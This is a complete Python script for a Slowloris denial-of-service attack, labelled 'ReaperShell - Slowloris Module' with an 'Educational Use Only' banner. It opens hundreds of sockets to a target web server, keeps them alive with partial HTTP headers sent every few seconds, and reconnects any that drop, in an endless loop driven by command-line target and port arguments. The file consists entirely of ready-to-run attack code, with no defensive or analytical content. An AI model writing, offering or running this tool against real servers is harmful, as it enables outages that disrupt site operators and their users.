#!/usr/bin/env python3

import socket
import time
import random

print("[*] ReaperShell - Slowloris Module")
print("[*] Educational Use Only")

def slowloris_attack(target, port=80, sockets_count=200, sleep_time=15):
    sockets = []

    print(f"[+] Connecting to {target}:{port} with {sockets_count} sockets...")

    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {target}\r\n".encode('utf-8'))
            s.send("User-Agent: ReaperShell/1.0\r\n".encode('utf-8'))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
            sockets.append(s)
        except socket.error:
            break

    print(f"[+] Connected {len(sockets)} sockets. Sending partial headers every {sleep_time} seconds...")

    while True:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
            except socket.error:
                sockets.remove(s)
                try:
                    new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_socket.settimeout(4)
                    new_socket.connect((target, port))
                    new_socket.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode('utf-8'))
                    new_socket.send(f"Host: {target}\r\n".encode('utf-8'))
                    sockets.append(new_socket)
                except socket.error:
                    continue

        print(f"[+] Sockets alive: {len(sockets)}")
        time.sleep(sleep_time)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 slowloris.py <target> [port] [sockets] [sleep]")
        print("Example: python3 slowloris.py example.com 80 200 15")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    sockets = int(sys.argv[3]) if len(sys.argv) > 3 else 200
    sleep = int(sys.argv[4]) if len(sys.argv) > 4 else 15

    slowloris_attack(target, port, sockets, sleep)